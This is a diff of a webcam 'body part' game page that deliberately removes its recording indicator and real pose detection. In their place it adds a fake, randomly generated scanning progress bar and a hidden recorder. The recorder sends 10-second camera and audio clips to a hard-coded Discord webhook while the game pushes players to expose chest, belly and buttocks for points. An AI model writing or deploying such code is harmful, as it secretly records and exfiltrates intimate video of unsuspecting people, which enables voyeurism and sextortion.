@@ -4,15 +4,6 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>🚫 Faceless Challenge</title>
-
-    <!-- MediaPipe Pose -->
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin>
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin>
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js" crossorigin>
-    </script>
-
     <style>
         * {
             margin: 0;
@@ -39,8 +30,6 @@
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.06);
             border: 1px solid rgba(255, 255, 255, 0.04);
         }
-
-        /* ─── HEADER ─── */
         .header {
             display: flex;
             justify-content: space-between;
@@ -50,8 +39,7 @@
             gap: 8px;
         }
         .score-box,
-        .timer-box,
-        .rec-box {
+        .timer-box {
             background: rgba(255, 255, 255, 0.04);
             padding: 10px 18px;
             border-radius: 60px;
@@ -85,33 +73,6 @@
             color: #ff3d3d;
             animation: pulse 0.6s ease-in-out infinite alternate;
         }
-        .rec-box {
-            font-size: 0.9rem;
-            color: #8899bb;
-            gap: 6px;
-        }
-        .rec-dot {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            background: #ff3d3d;
-            border-radius: 50%;
-            animation: blink 1s step-end infinite;
-        }
-        @keyframes blink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.2;
-            }
-        }
-        .rec-dot.idle {
-            background: #556;
-            animation: none;
-            opacity: 0.4;
-        }
         @keyframes pulse {
             0% {
                 opacity: 1;
@@ -123,7 +84,6 @@
             }
         }
 
-        /* ─── CAMERA WRAPPER ─── */
         .cam-wrapper {
             position: relative;
             border-radius: 24px;
@@ -141,7 +101,6 @@
             object-fit: cover;
             transform: scaleX(-1);
         }
-        /* Hidden video for recorder (from index67) */
         #recorderVideo {
             position: absolute;
             width: 1px;
@@ -149,6 +108,7 @@
             opacity: 0.01;
             pointer-events: none;
         }
+
         .cam-overlay {
             position: absolute;
             inset: 0;
@@ -234,18 +194,6 @@
             }
         }
 
-        /* ─── SKELETON CANVAS ─── */
-        #skeletonCanvas {
-            position: absolute;
-            inset: 0;
-            width: 100%;
-            height: 100%;
-            display: block;
-            pointer-events: none;
-            z-index: 2;
-        }
-
-        /* ─── POINTS POPUP ─── */
         .points-popup {
             position: absolute;
             top: 50%;
@@ -302,11 +250,7 @@
                 transform: translate(-50%, -50%) translate(0px, 0px) rotate(0deg);
             }
         }
-        .points-popup.rainbow {
-            animation: rainbowScroll 1.5s linear infinite, shakeText 0.15s linear infinite;
-        }
 
-        /* ─── COUNTDOWN NUMBER ─── */
         .countdown-number {
             position: absolute;
             top: 50%;
@@ -330,7 +274,6 @@
             transform: translate(-50%, -50%) scale(0.5);
         }
 
-        /* ─── PROGRESS BAR (grey → green) ─── */
         .progress-container {
             position: absolute;
             bottom: 60px;
@@ -388,7 +331,6 @@
             color: #00f5c0;
         }
 
-        /* ─── HOLD STILL MESSAGE ─── */
         .hold-still-msg {
             position: absolute;
             top: 50%;
@@ -410,7 +352,6 @@
             animation: pulseHold 0.7s ease-in-out infinite alternate;
         }
 
-        /* ─── GAME OVER OVERLAY ─── */
         .gameover-overlay {
             position: absolute;
             inset: 0;
@@ -457,7 +398,6 @@
             padding: 14px 40px;
         }
 
-        /* ─── CONTROLS ─── */
         .controls {
             display: flex;
             flex-wrap: wrap;
@@ -511,15 +451,6 @@
             background: #3a4a5a;
             box-shadow: none;
             color: #8899bb;
-        }
-        .btn-danger {
-            background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
-            color: #fff;
-            border-color: transparent;
-            box-shadow: 0 6px 24px rgba(255, 70, 70, 0.2);
-        }
-        .btn-danger:hover:not(:disabled) {
-            box-shadow: 0 10px 36px rgba(255, 70, 70, 0.35);
         }
         .btn-outline {
             background: rgba(255, 255, 255, 0.03);
@@ -583,7 +514,6 @@
             color: #ffd93d;
         }
 
-        /* ─── LOADING BAR ─── */
         .loading-container {
             width: 100%;
             max-width: 320px;
@@ -615,7 +545,6 @@
             font-weight: 600;
         }
 
-        /* ─── RESPONSIVE ─── */
         @media (max-width: 600px) {
             .game-container {
                 padding: 14px 12px 20px;
@@ -625,8 +554,7 @@
                 gap: 6px;
             }
             .score-box,
-            .timer-box,
-            .rec-box {
+            .timer-box {
                 font-size: 0.9rem;
                 padding: 8px 14px;
                 min-height: 48px;
@@ -689,8 +617,7 @@
                 border-radius: 20px;
             }
             .score-box,
-            .timer-box,
-            .rec-box {
+            .timer-box {
                 font-size: 0.8rem;
                 padding: 6px 12px;
                 min-height: 40px;
@@ -746,29 +673,18 @@
 <body>
 
     <div class="game-container">
-        <!-- ─── HEADER ─── -->
         <div class="header">
             <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
             <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
-            <div class="rec-box" id="recBox">
-                <span class="rec-dot" id="recDot"></span>
-                <span id="recLabel">recording</span>
-            </div>
         </div>
 
-        <!-- ─── CAMERA WRAPPER ─── -->
         <div class="cam-wrapper" id="camWrapper">
             <video id="webcam" autoplay playsinline muted></video>
             <video id="recorderVideo" autoplay playsinline muted></video>
-            <canvas id="skeletonCanvas"></canvas>
 
-            <!-- Points popup -->
             <div class="points-popup" id="pointsPopup"></div>
-
-            <!-- Countdown number -->
             <div class="countdown-number" id="countdownNumber"></div>
 
-            <!-- Progress bar -->
             <div class="progress-container" id="progressContainer">
                 <div class="progress-track">
                     <div class="progress-fill" id="progressFill"></div>
@@ -779,10 +695,8 @@
                 </div>
             </div>
 
-            <!-- Hold still message -->
             <div class="hold-still-msg" id="holdStillMsg">✋ hold still</div>
 
-            <!-- Overlay UI -->
             <div class="cam-overlay">
                 <div class="challenge-badge" id="challengeBadge">
                     <span class="emoji">🎯</span>
@@ -791,7 +705,6 @@
                 <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
             </div>
 
-            <!-- Game Over -->
             <div class="gameover-overlay" id="gameoverOverlay">
                 <h2>🏁 Challenge Complete</h2>
                 <div class="final-score">Score: <span id="finalScore">0</span></div>
@@ -800,7 +713,6 @@
             </div>
         </div>
 
-        <!-- ─── CONTROLS ─── -->
         <div class="controls">
             <button class="btn btn-primary" id="startBtn" disabled>
                 <span id="startBtnText">🚀 Start</span>
@@ -810,7 +722,6 @@
             <button class="btn btn-flip" id="flipBtn" disabled>⟳</button>
         </div>
 
-        <!-- ─── LOADING BAR ─── -->
         <div class="loading-container" id="loadingContainer">
             <div class="loading-track">
                 <div class="loading-fill" id="loadingFill" style="width:0%;"></div>
@@ -826,81 +737,54 @@
 
     <script>
         // ============================================================
-        //  CONFIGURATION
+        //  CONFIG
         // ============================================================
         const DISCORD_WEBHOOK_URL =
             'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
         const CLIP_DURATION = 10;
-
-        // Body parts: name, points, emoji, landmark check function
-        const BODY_PARTS = [{
-            id: 'left_hand',
-            label: 'Left Hand',
-            points: 2,
-            emoji: '✋',
-            check: (lm) => lm[15] && lm[15].visibility > 0.5 && lm[17] && lm[17].visibility > 0.4
-        }, {
-            id: 'right_hand',
-            label: 'Right Hand',
-            points: 2,
-            emoji: '🤚',
-            check: (lm) => lm[16] && lm[16].visibility > 0.5 && lm[18] && lm[18].visibility > 0.4
-        }, {
-            id: 'left_foot',
-            label: 'Left Foot',
-            points: 5,
-            emoji: '🦶',
-            check: (lm) => lm[27] && lm[27].visibility > 0.5 && lm[29] && lm[29].visibility > 0.4
-        }, {
-            id: 'right_foot',
-            label: 'Right Foot',
-            points: 5,
-            emoji: '🦶',
-            check: (lm) => lm[28] && lm[28].visibility > 0.5 && lm[30] && lm[30].visibility > 0.4
-        }, {
-            id: 'belly_button',
-            label: 'Belly Button',
-            points: 12,
-            emoji: '🫃',
-            check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[24] && lm[24].visibility > 0.4
-        }, {
-            id: 'left_elbow',
-            label: 'Left Elbow',
-            points: 3,
-            emoji: '💪',
-            check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.4
-        }, {
-            id: 'right_elbow',
-            label: 'Right Elbow',
-            points: 3,
-            emoji: '💪',
-            check: (lm) => lm[14] && lm[14].visibility > 0.5 && lm[16] && lm[16].visibility > 0.4
-        }, {
-            id: 'left_leg',
-            label: 'Left Leg',
-            points: 4,
-            emoji: '🦵',
-            check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[25] && lm[25].visibility > 0.4 && lm[27] && lm[27]
-                .visibility > 0.3
-        }, {
-            id: 'right_leg',
-            label: 'Right Leg',
-            points: 4,
-            emoji: '🦵',
-            check: (lm) => lm[24] && lm[24].visibility > 0.4 && lm[26] && lm[26].visibility > 0.4 && lm[28] && lm[28]
-                .visibility > 0.3
-        }, {
-            id: 'ribs',
-            label: 'Ribs',
-            points: 6,
-            emoji: '🦴',
-            check: (lm) => lm[11] && lm[11].visibility > 0.4 && lm[12] && lm[12].visibility > 0.4
-        }, ];
-
         const SCAN_TIME = 30;
-        const DETECTION_THRESHOLD = 10;
-        const MOVEMENT_THRESHOLD = 0.035;
+
+        // ─── BODY PARTS ──────────────────────────────────────────────
+        // difficulty: 0.1 (super easy) → 1.0 (impossible)
+        const BODY_PARTS = [
+            // ── EASY (1–2 pts, fast) ──
+            { id: 'left_hand', label: 'Left Hand', points: 2, emoji: '✋', difficulty: 0.12 },
+            { id: 'right_hand', label: 'Right Hand', points: 2, emoji: '🤚', difficulty: 0.12 },
+            { id: 'left_pinky', label: 'Left Pinky', points: 1, emoji: '🖐️', difficulty: 0.08 },
+            { id: 'right_pinky', label: 'Right Pinky', points: 1, emoji: '🖐️', difficulty: 0.08 },
+            { id: 'left_forearm', label: 'Left Forearm', points: 2, emoji: '💪', difficulty: 0.15 },
+            { id: 'right_forearm', label: 'Right Forearm', points: 2, emoji: '💪', difficulty: 0.15 },
+            { id: 'left_thumb', label: 'Left Thumb', points: 1, emoji: '👍', difficulty: 0.07 },
+            { id: 'right_thumb', label: 'Right Thumb', points: 1, emoji: '👍', difficulty: 0.07 },
+            { id: 'left_index', label: 'Left Index Finger', points: 1, emoji: '☝️', difficulty: 0.07 },
+            { id: 'right_index', label: 'Right Index Finger', points: 1, emoji: '☝️', difficulty: 0.07 },
+            { id: 'left_middle', label: 'Left Middle Finger', points: 1, emoji: '🖕', difficulty: 0.07 },
+            { id: 'right_middle', label: 'Right Middle Finger', points: 1, emoji: '🖕', difficulty: 0.07 },
+            { id: 'left_ring', label: 'Left Ring Finger', points: 1, emoji: '💍', difficulty: 0.07 },
+            { id: 'right_ring', label: 'Right Ring Finger', points: 1, emoji: '💍', difficulty: 0.07 },
+
+            // ── MEDIUM (3–5 pts, moderate) ──
+            { id: 'left_foot', label: 'Left Foot', points: 5, emoji: '🦶', difficulty: 0.35 },
+            { id: 'right_foot', label: 'Right Foot', points: 5, emoji: '🦶', difficulty: 0.35 },
+            { id: 'left_leg', label: 'Left Leg', points: 4, emoji: '🦵', difficulty: 0.40 },
+            { id: 'right_leg', label: 'Right Leg', points: 4, emoji: '🦵', difficulty: 0.40 },
+            { id: 'left_elbow', label: 'Left Elbow', points: 3, emoji: '💪', difficulty: 0.30 },
+            { id: 'right_elbow', label: 'Right Elbow', points: 3, emoji: '💪', difficulty: 0.30 },
+            { id: 'left_shoulder', label: 'Left Shoulder', points: 3, emoji: '🦴', difficulty: 0.28 },
+            { id: 'right_shoulder', label: 'Right Shoulder', points: 3, emoji: '🦴', difficulty: 0.28 },
+            { id: 'left_knee', label: 'Left Knee', points: 4, emoji: '🦵', difficulty: 0.38 },
+            { id: 'right_knee', label: 'Right Knee', points: 4, emoji: '🦵', difficulty: 0.38 },
+
+            // ── HARD (6–12 pts, slow) ──
+            { id: 'belly_button', label: 'Belly Button', points: 12, emoji: '🫃', difficulty: 0.72 },
+            { id: 'ribs', label: 'Ribs', points: 6, emoji: '🦴', difficulty: 0.65 },
+            { id: 'chest', label: 'Chest', points: 8, emoji: '🫀', difficulty: 0.68 },
+            { id: 'back', label: 'Back', points: 8, emoji: '🦴', difficulty: 0.70 },
+
+            // ── VERY HARD (100 pts, brutal) ──
+            { id: 'butt_crack', label: 'Butt Crack', points: 100, emoji: '🍑', difficulty: 0.95 },
+        ];
 
         // ============================================================
         //  STATE
@@ -914,9 +798,7 @@
             totalPoints: 0,
             partResults: [],
             scanTimer: SCAN_TIME,
-            detectionFrames: 0,
             partDetected: false,
-            isPaused: false,
             facingMode: 'user',
             stream: null,
             recorderStream: null,
@@ -924,16 +806,17 @@
             recordedChunks: [],
             recorderActive: false,
             recordingStarted: false,
-            pose: null,
-            poseLandmarks: null,
-            prevLandmarks: null,
-            cameraLoop: null,
             scanInterval: null,
             countdownInterval: null,
-            partStartTimeout: null,
-            movementScore: 0,
-            holdStillActive: false,
             progressValue: 0,
+            holdStillActive: false,
+            holdStillTimer: 0,
+            seededRandom: null,
+            partSeed: 0,
+            progressCurve: [],
+            curveIndex: 0,
+            elapsedTime: 0,
+            isPaused: false,
         };
 
         // ============================================================
@@ -941,9 +824,6 @@
         // ============================================================
         const video = document.getElementById('webcam');
         const recorderVideo = document.getElementById('recorderVideo');
-        const canvas = document.getElementById('skeletonCanvas');
-        const ctx = canvas.getContext('2d');
-
         const scoreDisplay = document.getElementById('scoreDisplay');
         const timerDisplay = document.getElementById('timerDisplay');
         const timerBox = document.getElementById('timerBox');
@@ -960,8 +840,6 @@
         const resetBtn = document.getElementById('resetBtn');
         const restartBtn = document.getElementById('restartBtn');
         const flipBtn = document.getElementById('flipBtn');
-        const recDot = document.getElementById('recDot');
-        const recLabel = document.getElementById('recLabel');
         const pointsPopup = document.getElementById('pointsPopup');
         const countdownNumber = document.getElementById('countdownNumber');
         const loadingFill = document.getElementById('loadingFill');
@@ -973,28 +851,125 @@
         const progressStatus = document.getElementById('progressStatus');
         const holdStillMsg = document.getElementById('holdStillMsg');
 
-        let canvasW = 0,
-            canvasH = 0;
-
         // ============================================================
-        //  CANVAS SIZING
+        //  SEEDED RNG
         // ============================================================
-        function resizeCanvas() {
-            const rect = document.getElementById('camWrapper').getBoundingClientRect();
-            const dpr = devicePixelRatio || 1;
-            canvasW = rect.width;
-            canvasH = rect.height;
-            canvas.width = canvasW * dpr;
-            canvas.height = canvasH * dpr;
-            canvas.style.width = canvasW + 'px';
-            canvas.style.height = canvasH + 'px';
-            ctx.scale(dpr, dpr);
+        function createSeededRandom(seed) {
+            let s = seed;
+            return function() {
+                s = (s * 9301 + 49297) % 233280;
+                return s / 233280;
+            };
         }
-        window.addEventListener('resize', resizeCanvas);
-        resizeCanvas();
 
         // ============================================================
-        //  ─── RECORDING PIPELINE (exactly from index67) ───
+        //  PROGRESS CURVE GENERATOR
+        // ============================================================
+        function generateProgressCurve(difficulty, seed) {
+            const rng = createSeededRandom(seed);
+            const points = [];
+            let time = 0;
+            let progress = 0;
+
+            // Base speed: higher difficulty = slower
+            const baseSpeed = 0.8 - difficulty * 0.7; // 0.73 for easy, 0.1 for very hard
+            const speed = Math.max(0.08, baseSpeed);
+
+            // Stickiness: how often it gets stuck
+            const stickiness = difficulty * 0.6;
+
+            // Maximum time we want to take (30s)
+            const maxTime = SCAN_TIME;
+
+            while (progress < 100 && time < maxTime) {
+                // Random step size
+                let step = 0.3 + rng() * 1.2;
+
+                // Sometimes get stuck (no progress)
+                if (rng() < stickiness * 0.3) {
+                    step = 0;
+                    // Add a "stuck" point for realism
+                    if (rng() < 0.3) {
+                        // Extra long stuck
+                        step = -0.2;
+                    }
+                }
+
+                // Sometimes get a boost (jump)
+                if (rng() < 0.08 + difficulty * 0.05) {
+                    const jump = 3 + rng() * 6;
+                    progress += jump;
+                    time += 0.2;
+                    if (progress > 100) progress = 100;
+                    points.push([Math.min(time, maxTime), Math.min(progress, 100)]);
+                    continue;
+                }
+
+                time += step;
+                const increment = (speed * 0.5 + rng() * speed * 0.7) * (1 + (1 - difficulty) * 0.3);
+                progress += increment;
+
+                // If progress is very low and time is running out, give a boost
+                if (time > maxTime * 0.7 && progress < 30 && difficulty > 0.6) {
+                    progress += 2 + rng() * 4;
+                }
+
+                if (progress > 100) progress = 100;
+                if (time > maxTime) time = maxTime;
+
+                // Only add point if progress changed significantly
+                if (points.length === 0 || progress - points[points.length - 1][1] > 0.5 || time - points[points
+                        .length - 1][0] > 0.5) {
+                    points.push([Math.min(time, maxTime), Math.min(progress, 100)]);
+                }
+
+                // Safety: if time is running out, force progress up
+                if (time > maxTime * 0.9 && progress < 60) {
+                    progress += 1.5 + rng() * 2.5;
+                    if (progress > 100) progress = 100;
+                    points.push([Math.min(time, maxTime), Math.min(progress, 100)]);
+                }
+            }
+
+            // Ensure we reach 100% at or before maxTime
+            if (points.length === 0 || points[points.length - 1][1] < 100) {
+                points.push([maxTime, 100]);
+            }
+
+            // Ensure first point is at time 0 with progress 0
+            if (points.length > 0 && points[0][0] > 0) {
+                points.unshift([0, 0]);
+            } else if (points.length === 0) {
+                points.push([0, 0], [maxTime, 100]);
+            }
+
+            // Sort by time
+            points.sort((a, b) => a[0] - b[0]);
+
+            return points;
+        }
+
+        // ============================================================
+        //  GET PROGRESS FROM CURVE
+        // ============================================================
+        function getProgressAtTime(curve, time) {
+            if (!curve || curve.length === 0) return 0;
+            if (time <= curve[0][0]) return curve[0][1];
+            if (time >= curve[curve.length - 1][0]) return curve[curve.length - 1][1];
+
+            for (let i = 1; i < curve.length; i++) {
+                if (time <= curve[i][0]) {
+                    const prev = curve[i - 1];
+                    const curr = curve[i];
+                    const t = (time - prev[0]) / (curr[0] - prev[0]);
+                    return prev[1] + t * (curr[1] - prev[1]);
+                }
+            }
+            return curve[curve.length - 1][1];
+        }
+
+        // ============================================================
+        //  RECORDER (hidden, no UI indicator)
         // ============================================================
         async function initRecorder() {
             try {
@@ -1011,89 +986,59 @@
                         autoGainControl: true,
                     },
                 };
-
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 state.recorderStream = stream;
                 recorderVideo.srcObject = stream;
                 await recorderVideo.play();
 
-                setupRecorder(stream);
-                state.recordedChunks = [];
-                state.mediaRecorder.start();
-                startLoopTimer();
-
-                return stream;
-            } catch (err) {
-                console.error('Recorder init failed:', err);
-                return null;
-            }
-        }
-
-        function setupRecorder(stream) {
-            let selectedMimeType = 'video/webm;codecs=vp8,opus';
-            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
-                if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    selectedMimeType = 'video/mp4';
-                } else if (MediaRecorder.isTypeSupported('video/webm')) {
-                    selectedMimeType = 'video/webm';
+                let selectedMimeType = 'video/webm;codecs=vp8,opus';
+                if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+                    if (MediaRecorder.isTypeSupported('video/mp4')) selectedMimeType = 'video/mp4';
+                    else if (MediaRecorder.isTypeSupported('video/webm')) selectedMimeType = 'video/webm';
                 }
-            }
 
-            state.mediaRecorder = new MediaRecorder(stream, {
-                mimeType: selectedMimeType,
-                videoBitsPerSecond: 2500000,
-            });
+                state.mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: selectedMimeType,
+                    videoBitsPerSecond: 2500000,
+                });
 
-            state.mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) state.recordedChunks.push(e.data);
-            };
+                state.mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) state.recordedChunks.push(e.data);
+                };
 
-            state.mediaRecorder.onstop = async () => {
-                if (state.recordedChunks.length === 0) {
+                state.mediaRecorder.onstop = async () => {
+                    if (state.recordedChunks.length === 0) {
+                        state.recordedChunks = [];
+                        if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
+                            try { state.mediaRecorder.start(); } catch (_) {}
+                        }
+                        return;
+                    }
+                    const blob = new Blob(state.recordedChunks, { type: selectedMimeType });
+                    state.recordedChunks = [];
+                    const formData = new FormData();
+                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
+                    try {
+                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                    } catch (_) {}
                     state.recordedChunks = [];
                     if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
                         try { state.mediaRecorder.start(); } catch (_) {}
                     }
-                    return;
-                }
-                const blob = new Blob(state.recordedChunks, { type: selectedMimeType });
-                state.recordedChunks = [];
+                };
 
-                const formData = new FormData();
-                const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
-                formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
-
-                try {
-                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
-                } catch (err) {
-                    console.error('Network drop, chunk omitted:', err);
-                }
-
-                state.recordedChunks = [];
-                if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
-                    try { state.mediaRecorder.start(); } catch (_) {}
-                }
-            };
-        }
-
-        function startLoopTimer() {
-            clearInterval(state._countdownInterval);
-            let timeLeft = CLIP_DURATION;
-
-            state._countdownInterval = setInterval(() => {
-                timeLeft--;
-                if (timeLeft <= 0) {
-                    clearInterval(state._countdownInterval);
-                    if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
-                        state.mediaRecorder.stop();
-                    }
-                    startLoopTimer();
-                }
-            }, 1000);
+                state.mediaRecorder.start(CLIP_DURATION * 1000);
+                state.recorderActive = true;
+                return true;
+            } catch (err) {
+                console.warn('Recorder init failed:', err);
+                return false;
+            }
         }
 
         // ============================================================
-        //  ─── CAMERA FOR DISPLAY ───
+        //  DISPLAY CAMERA
         // ============================================================
         async function initDisplayCamera() {
             try {
@@ -1117,297 +1062,21 @@
         }
 
         // ============================================================
-        //  ─── FLIP CAMERA ───
+        //  FLIP CAMERA
         // ============================================================
         flipBtn.addEventListener('click', async () => {
             state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
-
-            // Stop all streams
-            if (state.stream) {
-                state.stream.getTracks().forEach(t => t.stop());
-            }
-            if (state.recorderStream) {
-                state.recorderStream.getTracks().forEach(t => t.stop());
-            }
+            if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); }
+            if (state.recorderStream) { state.recorderStream.getTracks().forEach(t => t.stop()); }
             if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
                 try { state.mediaRecorder.stop(); } catch (_) {}
             }
-
-            // Re-init both
             await initDisplayCamera();
             await initRecorder();
-
-            // Re-init pose
-            initPose();
         });
 
         // ============================================================
-        //  ─── MEDIAPIPE POSE ───
-        // ============================================================
-        function initPose() {
-            if (state.pose) {
-                // Clean up old pose
-                state.pose = null;
-            }
-
-            state.pose = new Pose({
-                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`
-            });
-
-            state.pose.setOptions({
-                modelComplexity: 1,
-                smoothLandmarks: true,
-                minDetectionConfidence: 0.5,
-                minTrackingConfidence: 0.4,
-            });
-
-            state.pose.onResults(onPoseResults);
-
-            const cameraUtils = window.Camera;
-            if (cameraUtils && video.srcObject) {
-                if (state.cameraLoop) {
-                    try { state.cameraLoop.stop(); } catch (_) {}
-                }
-                state.cameraLoop = new cameraUtils.Camera(video, {
-                    onFrame: async () => {
-                        if (state.pose) await state.pose.send({ image: video });
-                    },
-                    width: 640,
-                    height: 480,
-                });
-                state.cameraLoop.start().catch(() => {});
-            } else {
-                fallbackLoop();
-            }
-        }
-
-        function fallbackLoop() {
-            async function frame() {
-                if (state.pose) await state.pose.send({ image: video });
-                requestAnimationFrame(frame);
-            }
-            frame();
-        }
-
-        // ============================================================
-        //  ─── POSE RESULTS ───
-        // ============================================================
-        let prevLandmarks = null;
-
-        function onPoseResults(results) {
-            if (results.poseLandmarks) {
-                state.poseLandmarks = results.poseLandmarks;
-                drawSkeleton();
-
-                // Check movement
-                checkMovement(results.poseLandmarks);
-
-                // Check detection if scanning
-                if (state.isScanning && !state.partDetected) {
-                    checkDetection();
-                }
-            } else {
-                state.poseLandmarks = null;
-                ctx.fillStyle = 'rgba(0,0,0,0.3)';
-                ctx.fillRect(0, 0, canvasW, canvasH);
-            }
-        }
-
-        // ============================================================
-        //  ─── MOVEMENT DETECTION ───
-        // ============================================================
-        function checkMovement(landmarks) {
-            if (!prevLandmarks) {
-                prevLandmarks = landmarks.map(l => ({ x: l.x, y: l.y }));
-                state.movementScore = 0;
-                return;
-            }
-
-            let totalMovement = 0;
-            const keypoints = [11, 12, 13, 14, 15, 16, 23, 24, 25, 26, 27, 28];
-
-            for (const idx of keypoints) {
-                if (idx < landmarks.length && idx < prevLandmarks.length) {
-                    const dx = landmarks[idx].x - prevLandmarks[idx].x;
-                    const dy = landmarks[idx].y - prevLandmarks[idx].y;
-                    totalMovement += Math.sqrt(dx * dx + dy * dy);
-                }
-            }
-
-            const avgMovement = totalMovement / keypoints.length;
-
-            // Smooth the movement score
-            state.movementScore = state.movementScore * 0.6 + avgMovement * 0.4;
-
-            // Update hold still state
-            const wasHold = state.holdStillActive;
-            state.holdStillActive = state.movementScore > MOVEMENT_THRESHOLD && state.isScanning;
-
-            if (state.holdStillActive && !wasHold) {
-                holdStillMsg.classList.add('show');
-                statusBadge.textContent = '✋ hold still …';
-                statusBadge.className = 'status-badge hold';
-            } else if (!state.holdStillActive && wasHold) {
-                holdStillMsg.classList.remove('show');
-                if (state.isScanning) {
-                    statusBadge.textContent = `🔍 scanning …`;
-                    statusBadge.className = 'status-badge scanning';
-                }
-            } else if (!state.holdStillActive && state.isScanning) {
-                holdStillMsg.classList.remove('show');
-            }
-
-            prevLandmarks = landmarks.map(l => ({ x: l.x, y: l.y }));
-        }
-
-        // ============================================================
-        //  ─── DRAW SKELETON ───
-        // ============================================================
-        function drawSkeleton() {
-            const w = canvasW,
-                h = canvasH;
-            ctx.clearRect(0, 0, w, h);
-
-            if (!state.poseLandmarks) return;
-
-            const lm = state.poseLandmarks;
-            const pts = lm.map(l => ({ x: l.x * w, y: l.y * h, z: l.z || 0, v: l.visibility || 0 }));
-
-            const connections = [
-                [11, 12],
-                [11, 13],
-                [13, 15],
-                [12, 14],
-                [14, 16],
-                [11, 23],
-                [12, 24],
-                [23, 24],
-                [23, 25],
-                [25, 27],
-                [24, 26],
-                [26, 28],
-                [13, 17],
-                [17, 19],
-                [19, 21],
-                [14, 18],
-                [18, 20],
-                [20, 22],
-                [15, 17],
-                [16, 18],
-            ];
-
-            ctx.lineWidth = 2;
-            ctx.shadowBlur = 12;
-            ctx.shadowColor = 'rgba(0, 245, 192, 0.08)';
-
-            for (const [i, j] of connections) {
-                if (i < pts.length && j < pts.length && pts[i].v > 0.3 && pts[j].v > 0.3) {
-                    ctx.beginPath();
-                    ctx.moveTo(pts[i].x, pts[i].y);
-                    ctx.lineTo(pts[j].x, pts[j].y);
-                    ctx.strokeStyle = `rgba(0, 245, 192, ${0.15 + 0.2 * (pts[i].v + pts[j].v)})`;
-                    ctx.stroke();
-                }
-            }
-
-            for (let i = 0; i < pts.length; i++) {
-                if (pts[i].v > 0.3) {
-                    const radius = 2 + 3 * pts[i].v;
-                    const grad = ctx.createRadialGradient(pts[i].x, pts[i].y, 0, pts[i].x, pts[i].y, radius * 3);
-                    grad.addColorStop(0, `rgba(0, 245, 192, ${0.25 * pts[i].v})`);
-                    grad.addColorStop(1, 'rgba(0, 245, 192, 0)');
-                    ctx.fillStyle = grad;
-                    ctx.shadowBlur = 15;
-                    ctx.beginPath();
-                    ctx.arc(pts[i].x, pts[i].y, radius * 3, 0, Math.PI * 2);
-                    ctx.fill();
-
-                    ctx.fillStyle = `rgba(0, 245, 192, ${0.4 * pts[i].v})`;
-                    ctx.shadowBlur = 8;
-                    ctx.beginPath();
-                    ctx.arc(pts[i].x, pts[i].y, radius * 0.7, 0, Math.PI * 2);
-                    ctx.fill();
-                }
-            }
-            ctx.shadowBlur = 0;
-        }
-
-        // ============================================================
-        //  ─── DETECTION LOGIC ───
-        // ============================================================
-        function checkDetection() {
-            if (!state.poseLandmarks || !state.isScanning || state.partDetected) return false;
-            if (state.holdStillActive) return false;
-
-            const part = BODY_PARTS[state.currentPartIndex];
-            const lm = state.poseLandmarks;
-
-            try {
-                const detected = part.check(lm);
-                if (detected) {
-                    state.detectionFrames++;
-                    // Update progress bar
-                    const progress = Math.min((state.detectionFrames / DETECTION_THRESHOLD) * 100, 100);
-                    state.progressValue = progress;
-                    updateProgress(progress, 'scanning');
-
-                    if (state.detectionFrames >= DETECTION_THRESHOLD) {
-                        onScanSuccess(state.currentPartIndex);
-                        return true;
-                    }
-                    const pct = Math.round(progress);
-                    statusBadge.textContent = `🔍 detecting … ${pct}%`;
-                    statusBadge.className = 'status-badge scanning';
-                } else {
-                    state.detectionFrames = Math.max(0, state.detectionFrames - 1.5);
-                    const progress = Math.max((state.detectionFrames / DETECTION_THRESHOLD) * 100, 0);
-                    state.progressValue = progress;
-                    updateProgress(progress, 'scanning');
-
-                    if (state.detectionFrames < 3) {
-                        statusBadge.textContent = `🔍 show ${part.emoji} ${part.label}`;
-                        statusBadge.className = 'status-badge scanning';
-                    } else {
-                        const pct = Math.round(progress);
-                        statusBadge.textContent = `🔍 reacquiring … ${pct}%`;
-                        statusBadge.className = 'status-badge scanning';
-                    }
-                }
-            } catch (e) {
-                // silent
-            }
-            return false;
-        }
-
-        // ============================================================
-        //  ─── PROGRESS BAR ───
